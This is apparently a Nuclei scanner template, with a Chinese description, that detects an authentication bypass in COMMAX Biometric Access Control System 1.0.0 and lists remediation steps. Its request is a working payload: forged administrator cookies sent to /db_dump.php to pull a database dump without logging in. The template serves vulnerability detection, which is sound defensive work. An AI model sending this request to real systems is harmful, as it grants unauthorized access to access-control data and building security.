id: commax-biometric-auth-bypass

info:
  name: COMMAX Biometric Access Control System 1.0.0 - 认证绕过漏洞
  author: gy741
  severity: critical
  description: |
    该模板用于检测 COMMAX Biometric Access Control System 1.0.0 - 认证绕过漏洞。该类漏洞通常源于认证、授权或会话校验逻辑不完整，使未授权用户可访问受保护接口或执行敏感操作。模板会向 `/db_dump.php` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可绕过登录或权限限制，访问管理功能、敏感数据或业务操作接口。
    - 在管理接口暴露的场景下，可能进一步导致配置被篡改、账号被接管或系统被植入后门。
  remediation: |
    - 在服务端统一执行认证和授权校验，避免仅依赖前端控制或可预测参数。
    - 修复存在绕过问题的版本，并限制管理接口、调试接口和敏感 API 的访问来源。
    - 审计异常登录、权限变更和配置修改记录，轮换可能受影响的账号凭据。
  reference:
    - https://www.exploit-db.com/exploits/50206
    - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5661.php
  metadata:
    max-request: 1
  tags: commax,auth-bypass,edb,vuln

http:
  - raw:
      - |
        GET /db_dump.php HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Referer: {{BaseURL}}/user_add.php
        Cookie: CMX_SAVED_ID=zero; CMX_ADMIN_ID=science; CMX_ADMIN_NM=liquidworm; CMX_ADMIN_LV=9; CMX_COMPLEX_NM=ZSL; CMX_COMPLEX_IP=2.5.1.0

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<title>::: COMMAX :::</title>"

      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200
